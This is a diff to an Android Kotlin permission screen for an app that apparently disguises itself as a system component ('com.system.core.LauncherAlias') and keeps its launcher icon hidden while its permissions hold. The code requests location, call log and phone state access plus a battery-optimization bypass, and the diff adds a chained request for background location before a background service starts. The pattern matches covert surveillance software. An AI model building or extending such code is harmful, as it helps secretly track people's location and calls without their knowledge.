@@ -22,6 +22,7 @@ import androidx.core.content.ContextCompat
 class PermissionActivity : AppCompatActivity() {
 
     private val PERMISSION_REQUEST_CODE = 1001
+    private val PERMISSION_REQUEST_BACKGROUND_CODE = 1002
 
     companion object {
         /**
@@ -30,23 +31,6 @@ class PermissionActivity : AppCompatActivity() {
          * - If ANY permission revoked -> Re-enable app icon on launcher so user can re-grant!
          */
         fun checkAndToggleLauncherIcon(context: Context) {
-            val permissions = mutableListOf(
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_PHONE_STATE
-            )
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
-            }
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
-            } else {
-                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            }
-
             val aliasComponent = ComponentName(context, "com.system.core.LauncherAlias")
             val pm = context.packageManager
 
@@ -95,8 +79,25 @@ class PermissionActivity : AppCompatActivity() {
         if (missingPermissions.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
         } else {
-            requestBatteryOptimizationBypass()
+            checkAndRequestBackgroundLocation()
         }
+    }
+
+    private fun checkAndRequestBackgroundLocation() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            val hasFineLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+            val hasBackgroundLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
+
+            if (hasFineLocation && !hasBackgroundLocation) {
+                ActivityCompat.requestPermissions(
+                    this,
+                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
+                    PERMISSION_REQUEST_BACKGROUND_CODE
+                )
+                return
+            }
+        }
+        requestBatteryOptimizationBypass()
     }
 
     private fun requestBatteryOptimizationBypass() {
@@ -114,7 +115,11 @@ class PermissionActivity : AppCompatActivity() {
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        requestBatteryOptimizationBypass()
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            checkAndRequestBackgroundLocation()
+        } else if (requestCode == PERMISSION_REQUEST_BACKGROUND_CODE) {
+            requestBatteryOptimizationBypass()
+        }
     }
 
     private fun startBackgroundServiceAndFinish() {
